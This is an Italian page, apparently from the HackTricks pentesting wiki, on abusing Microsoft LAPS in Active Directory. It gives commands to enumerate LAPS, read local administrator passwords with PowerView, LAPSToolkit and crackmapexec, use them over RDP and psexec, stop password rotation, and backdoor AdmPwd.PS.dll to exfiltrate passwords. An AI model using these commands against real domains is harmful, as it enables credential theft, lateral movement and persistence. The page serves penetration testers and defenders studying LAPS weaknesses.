# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Local Administrator Password Solution (LAPS) è uno strumento utilizzato per gestire un sistema in cui le **password degli amministratori**, che sono **uniche, casuali e frequentemente cambiate**, vengono applicate ai computer uniti al dominio. Queste password sono memorizzate in modo sicuro all'interno di Active Directory e sono accessibili solo agli utenti a cui è stato concesso il permesso tramite le Liste di Controllo degli Accessi (ACL). La sicurezza delle trasmissioni delle password dal client al server è garantita dall'uso di **Kerberos versione 5** e **Advanced Encryption Standard (AES)**.

Nella struttura degli oggetti computer del dominio, l'implementazione di LAPS comporta l'aggiunta di due nuovi attributi: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Questi attributi memorizzano rispettivamente la **password dell'amministratore in chiaro** e **il suo tempo di scadenza**.

### Controlla se attivato
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Accesso alla Password LAPS

Puoi **scaricare la policy LAPS grezza** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e poi utilizzare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile dall'uomo.

Inoltre, i **cmdlet PowerShell nativi di LAPS** possono essere utilizzati se sono installati su una macchina a cui abbiamo accesso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** può essere utilizzato anche per scoprire **chi può leggere la password e leggerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Il [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l'enumerazione di LAPS con diverse funzioni.\
Una consiste nel parsing di **`ExtendedRights`** per **tutti i computer con LAPS abilitato.** Questo mostrerà **gruppi** specificamente **delegati a leggere le password LAPS**, che sono spesso utenti in gruppi protetti.\
Un **account** che ha **unito un computer** a un dominio riceve `All Extended Rights` su quell'host, e questo diritto conferisce all'**account** la capacità di **leggere le password**. L'enumerazione può mostrare un account utente che può leggere la password LAPS su un host. Questo può aiutarci a **mirare a utenti AD specifici** che possono leggere le password LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

Se non c'è accesso a PowerShell, puoi abusare di questo privilegio da remoto tramite LDAP utilizzando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Questo estrarrà tutte le password che l'utente può leggere, permettendoti di ottenere una migliore posizione con un utente diverso.

## ** Utilizzando la Password LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **Persistenza LAPS**

### **Data di Scadenza**

Una volta diventati amministratori, è possibile **ottenere le password** e **prevenire** che una macchina **aggiorni** la sua **password** **impostando la data di scadenza nel futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> La password verrà comunque reimpostata se un **admin** utilizza il **`Reset-AdmPwdPassword`** cmdlet; o se **Non consentire un tempo di scadenza della password più lungo di quanto richiesto dalla policy** è abilitato nella GPO LAPS.

### Backdoor

Il codice sorgente originale per LAPS può essere trovato [qui](https://github.com/GreyCorbel/admpwd), quindi è possibile inserire una backdoor nel codice (all'interno del metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`, ad esempio) che in qualche modo **esfiltra nuove password o le memorizza da qualche parte**.

Poi, basta compilare il nuovo `AdmPwd.PS.dll` e caricarlo sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e cambiare l'ora di modifica).

## Riferimenti

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)


{{#include ../../banners/hacktricks-training.md}}
